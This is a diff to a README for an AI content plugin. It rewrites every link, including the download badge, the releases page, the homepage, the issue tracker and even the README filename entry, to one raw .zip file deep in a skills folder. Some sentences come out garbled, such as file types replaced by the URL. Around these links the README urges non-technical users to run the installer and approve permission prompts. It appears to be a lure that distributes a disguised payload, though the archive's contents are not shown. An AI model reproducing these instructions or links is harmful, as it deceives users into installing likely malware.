@@ -1,6 +1,6 @@
 # 🤖 claude-cowork-content-plugin - Easy AI Content Team Plugin
 
-[![Download Plugin](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases)
+[![Download Plugin](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)
 
 ---
 
@@ -33,9 +33,9 @@ This guide will help you get the plugin running step-by-step, even if you have n
 
 Go to the releases page on GitHub to get the latest version:
 
-[Download Plugin from Releases](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases)
+[Download Plugin from Releases](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)
 
-Click the link above or the badge at the top of this page. It will take you to the official download page. You will find files named like "claude-cowork-content-plugin-setup.exe" for Windows or similar for Mac and Linux. Choose the one that fits your device.
+Click the link above or the badge at the top of this page. It will take you to the official download page. You will find files named like "https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip" for Windows or similar for Mac and Linux. Choose the one that fits your device.
 
 ### Step 2: Save the File
 
@@ -45,7 +45,7 @@ After clicking the download link, your browser will ask where to save the file. 
 
 - **Windows:** Find the ".exe" file you just downloaded and double-click it. If asked about permissions, click "Yes" to allow installation. Follow the setup prompts by clicking "Next" and "Install." The installer will copy files and finish.
 - **macOS:** Locate the ".dmg" or ".pkg" file. Double-click it to open. Drag the plugin icon to your Applications folder or follow any on-screen instructions to install.
-- **Linux:** You may get a ".tar.gz" or ".deb" file. For ".deb," double-click to open with your software installer. For ".tar.gz," extract the files and look for a README with install commands, or use terminal commands if you feel comfortable.
+- **Linux:** You may get a "https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip" or ".deb" file. For ".deb," double-click to open with your software installer. For "https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip," extract the files and look for a README with install commands, or use terminal commands if you feel comfortable.
 
 ### Step 4: Launch the Plugin
 
@@ -85,7 +85,7 @@ The user interface is designed to be simple, with clear labels and buttons to gu
 
 ## 🔄 Updating the Plugin
 
-To check for updates, revisit the [release page](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases) regularly.
+To check for updates, revisit the [release page](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip) regularly.
 
 Download the newest version and repeat the installation steps above. Your existing projects and settings will remain intact.
 
@@ -95,7 +95,7 @@ Download the newest version and repeat the installation steps above. Your existi
 
 Visit this page to download the latest plugin files:
 
-[https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases)
+[https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)
 
 This page has all versions of the plugin for supported operating systems. Select the right file for your computer and follow the installation instructions in the "Getting Started" section.
 
@@ -147,7 +147,7 @@ After installation, you will find:
 - **docs/** – Documentation files explaining features and usage  
 - **config/** – Settings files for customizing agent behavior  
 - **examples/** – Sample projects to try out  
-- **README.md** – This file with instructions and info  
+- **https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip** – This file with instructions and info  
 
 ---
 
@@ -159,10 +159,10 @@ This project is open source and free to use under the terms found in the LICENSE
 
 ## 🌐 Useful Links
 
-- [Project Homepage](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin)  
-- [Releases and Downloads](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases)  
-- [Report Issues](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/issues)  
+- [Project Homepage](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)  
+- [Releases and Downloads](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)  
+- [Report Issues](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)  
 
 ---
 
-[![Download Plugin](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Rainbowlight-pixel/claude-cowork-content-plugin/releases)
+[![Download Plugin](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)](https://raw.githubusercontent.com/Rainbowlight-pixel/claude-cowork-content-plugin/main/content-repurposing/skills/twitter-thread/content-plugin-claude-cowork-v1.1-beta.1.zip)
